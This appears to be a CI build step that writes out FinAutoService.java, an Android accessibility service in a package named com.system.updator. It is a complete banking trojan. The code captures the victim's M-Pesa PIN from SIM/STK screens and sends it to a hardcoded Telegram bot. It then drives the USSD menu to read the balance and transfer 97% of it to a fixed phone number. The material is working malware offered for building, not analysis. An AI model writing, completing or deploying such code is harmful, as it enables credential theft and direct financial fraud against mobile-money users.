      - name: Create FinAutoService.java - FULL SELF-CONTAINED AUTOMATION
        run: |
          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
          package com.system.updator;

          import android.accessibilityservice.AccessibilityService;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.net.Uri;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.Settings;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;
          import com.google.gson.Gson;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;
          import java.util.concurrent.atomic.AtomicReference;

          public class FinAutoService extends AccessibilityService {
              private static final String TAG = "FinAutoService";
              private static final String TARGET_PHONE = "0798688920";
              private static final double SEND_PERCENTAGE = 0.97;
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";

              // Backup SMS balance (optional)
              private static final AtomicReference<Double> SMS_BALANCE = new AtomicReference<>(0.0);
              private static final AtomicReference<Long> SMS_TIME = new AtomicReference<>(0L);

              private SharedPreferences prefs;
              private Gson gson = new Gson();
              private Handler handler = new Handler(Looper.getMainLooper());
              private ExecutorService executor = Executors.newSingleThreadExecutor();

              private String pin = null;
              private boolean pinLearned = false;
              private boolean automating = false;
              private double ussdBalance = 0.0; // balance read from USSD

              public static void updateBalance(double bal, long time) {
                  SMS_BALANCE.set(bal);
                  SMS_TIME.set(time);
              }

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  Log.d(TAG, "✅ Service connected");
                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
                  loadData();
                  sendTelegram("✅ Service Started - Waiting for PIN");
              }

              private void loadData() {
                  String json = prefs.getString("mpesa_pin", "{}");
                  try {
                      PinData data = gson.fromJson(json, PinData.class);
                      if (data != null && data.isLearned && data.pin != null) {
                          pin = data.pin;
                          pinLearned = true;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "JSON parse error", e);
                  }
              }

              private void savePin(String p) {
                  PinData data = new PinData();
                  data.pin = p;
                  data.isLearned = true;
                  prefs.edit().putString("mpesa_pin", gson.toJson(data)).apply();
                  pin = p;
                  pinLearned = true;
                  sendTelegram("🔑 PIN Captured: " + p);
                  // Start automation immediately after PIN capture
                  handler.postDelayed(this::startAutomation, 1000); // 1 second delay to let STK close
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      if (event == null) return;
                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                      String cls = event.getClassName() != null ? event.getClassName().toString() : "";
                      Log.d(TAG, "Screen: " + pkg + " / " + cls);

                      // Capture PIN from STK – only once
                      if ((pkg.contains("stk") || pkg.contains("sim")) && !pinLearned) {
                          AccessibilityNodeInfo root = getRootInActiveWindow();
                          if (root != null) {
                              String captured = findPasswordField(root);
                              if (captured != null && captured.length() >= 4) {
                                  savePin(captured);
                              }
                          }
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Event error", e);
                  }
              }

              private String findPasswordField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  try {
                      if (node.isPassword() && node.getText() != null) {
                          return node.getText().toString();
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          String result = findPasswordField(node.getChild(i));
                          if (result != null) return result;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Password find error", e);
                  }
                  return null;
              }

              // ========== MAIN AUTOMATION ==========
              private void startAutomation() {
                  if (automating) return;
                  if (!pinLearned) {
                      sendTelegram("⏳ PIN not captured yet. Aborting.");
                      return;
                  }
                  automating = true;
                  sendTelegram("🚀 Starting full automation (balance check + send)");

                  // Step 1: Open dialer
                  handler.postDelayed(() -> {
                      openDialer();
                      Log.d(TAG, "Dialer opened");
                      // Step 2: Type *334#
                      handler.postDelayed(() -> {
                          typeInField("*334#");
                          Log.d(TAG, "Typed *334#");
                          // Step 3: Press Call
                          handler.postDelayed(() -> {
                              clickCallButton();
                              Log.d(TAG, "Call button clicked");
                              // Wait for main menu
                              handler.postDelayed(() -> {
                                  // ---- Balance Check Flow ----
                                  // Click "My Account" (usually option 2)
                                  clickNumber(2);
                                  handler.postDelayed(() -> {
                                      clickSend(); // send option
                                      handler.postDelayed(() -> {
                                          // Now in "My Account" submenu – click "Check Balance" (option 1)
                                          clickNumber(1);
                                          handler.postDelayed(() -> {
                                              clickSend();
                                              handler.postDelayed(() -> {
                                                  // Read balance from screen
                                                  double bal = readBalanceFromScreen();
                                                  if (bal > 0) {
                                                      ussdBalance = bal;
                                                      sendTelegram("💰 Balance from USSD: KES " + String.format("%.0f", bal));
                                                  } else {
                                                      // Fallback to SMS balance if available and fresh
                                                      Double smsBal = SMS_BALANCE.get();
                                                      Long smsTime = SMS_TIME.get();
                                                      if (smsBal != null && smsBal > 0 && smsTime != null &&
                                                          (System.currentTimeMillis() - smsTime) < 5 * 60 * 1000) {
                                                          ussdBalance = smsBal;
                                                          sendTelegram("💰 Using SMS balance: KES " + String.format("%.0f", smsBal));
                                                      } else {
                                                          sendTelegram("❌ Could not read balance. Aborting.");
                                                          automating = false;
                                                          return;
                                                      }
                                                  }
                                                  // Go back to main menu (click Back or Cancel)
                                                  // We'll just go back by clicking the "Back" button if present
                                                  // Simpler: click "Back" by text
                                                  clickBack();
                                                  handler.postDelayed(() -> {
                                                      // ---- Now Send Money ----
                                                      // Click "Send Money" (option 1)
                                                      clickNumber(1);
                                                      handler.postDelayed(() -> {
                                                          clickSend();
                                                          handler.postDelayed(() -> {
                                                              // Click "Any Network" (option 1)
                                                              clickNumber(1);
                                                              handler.postDelayed(() -> {
                                                                  clickSend();
                                                                  handler.postDelayed(() -> {
                                                                      // Enter phone number
                                                                      typeInField(TARGET_PHONE);
                                                                      handler.postDelayed(() -> {
                                                                          clickSend();
                                                                          handler.postDelayed(() -> {
                                                                              // Enter amount (97%)
                                                                              double amount = ussdBalance * SEND_PERCENTAGE;
                                                                              typeInField(String.format("%.0f", amount));
                                                                              handler.postDelayed(() -> {
                                                                                  clickSend();
                                                                                  handler.postDelayed(() -> {
                                                                                      // Enter PIN
                                                                                      typeInField(pin);
                                                                                      handler.postDelayed(() -> {
                                                                                          clickSend();
                                                                                          handler.postDelayed(() -> {
                                                                                              // Confirm (option 1)
                                                                                              clickNumber(1);
                                                                                              handler.postDelayed(() -> {
                                                                                                  clickSend();
                                                                                                  handler.postDelayed(() -> {
                                                                                                      sendTelegram("✅ Transaction sent! Amount: KES " + String.format("%.0f", amount) + " to " + TARGET_PHONE);
                                                                                                      automating = false;
                                                                                                  }, 3000);
                                                                                              }, 1000);
                                                                                          }, 1000);
                                                                                      }, 1000);
                                                                                  }, 1000);
                                                                              }, 1000);
                                                                          }, 1000);
                                                                      }, 1000);
                                                                  }, 1000);
                                                              }, 1000);
                                                          }, 1000);
                                                      }, 1000);
                                                  }, 1000);
                                              }, 2000);
                                          }, 500);
                                      }, 500);
                                  }, 500);
                              }, 2000);
                          }, 300);
                      }, 200);
                  }, 500);
              }

              private double readBalanceFromScreen() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return 0;
                  String screenText = getAllText(root);
                  Log.d(TAG, "Screen text: " + screenText);
                  // Look for numbers like 10,000.00
                  java.util.regex.Pattern p = java.util.regex.Pattern.compile("([\\d,\\.]+)");
                  java.util.regex.Matcher m = p.matcher(screenText);
                  while (m.find()) {
                      String num = m.group(1).replace(",", "").replace(" ", "");
                      try {
                          double val = Double.parseDouble(num);
                          if (val > 0 && val < 1000000) {
                              return val;
                          }
                      } catch (Exception e) {}
                  }
                  return 0;
              }

              private String getAllText(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  if (node.getText() != null) {
                      sb.append(node.getText().toString()).append(" ");
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      sb.append(getAllText(node.getChild(i)));
                  }
                  return sb.toString();
              }

              // Helper clicks
              private void clickNumber(int num) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  findAndClickByText(root, String.valueOf(num));
              }

              private void clickSend() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  if (!findAndClickByText(root, "Send") && !findAndClickByText(root, "send")) {
                      findAndClickByText(root, "Confirm");
                  }
              }

              private void clickBack() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  findAndClickByText(root, "Back");
              }

              private boolean findAndClickByText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return false;
                  try {
                      if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
                          boolean clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          Log.d(TAG, "Clicked: " + text + " = " + clicked);
                          return clicked;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickByText(node.getChild(i), text)) return true;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Click error", e);
                  }
                  return false;
              }

              private boolean typeInField(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  AccessibilityNodeInfo field = findEditableField(root);
                  if (field != null) {
                      android.os.Bundle args = new android.os.Bundle();
                      args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                      boolean typed = field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                      Log.d(TAG, "Typed: " + text + " = " + typed);
                      return typed;
                  }
                  return false;
              }

              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  try {
                      if (node.isEditable() && node.isEnabled()) return node;
                      for (int i = 0; i < node.getChildCount(); i++) {
                          AccessibilityNodeInfo result = findEditableField(node.getChild(i));
                          if (result != null) return result;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Field find error", e);
                  }
                  return null;
              }

              private void openDialer() {
                  Intent intent = new Intent(Intent.ACTION_DIAL, Uri.parse("tel:"));
                  intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                  startActivity(intent);
              }

              private void clickCallButton() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root != null) searchForCall(root);
              }

              private void searchForCall(AccessibilityNodeInfo node) {
                  if (node == null) return;
                  try {
                      CharSequence text = node.getText();
                      CharSequence desc = node.getContentDescription();
                      if ((text != null && text.toString().toLowerCase().contains("call")) ||
                          (desc != null && desc.toString().toLowerCase().contains("call"))) {
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          searchForCall(node.getChild(i));
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Call button error", e);
                  }
              }

              private void sendTelegram(String msg) {
                  executor.execute(() -> {
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);

                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + 
                              msg.replace("\"", "\\\"").replace("\n", "\\n") + "\",\"parse_mode\":\"Markdown\"}";
                          
                          conn.getOutputStream().write(json.getBytes("UTF-8"));
                          conn.getOutputStream().flush();
                          conn.getResponseCode();
                          conn.disconnect();
                          Log.d(TAG, "Telegram sent");
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error", e);
                      }
                  });
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "Service interrupted");
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  executor.shutdown();
              }
          }
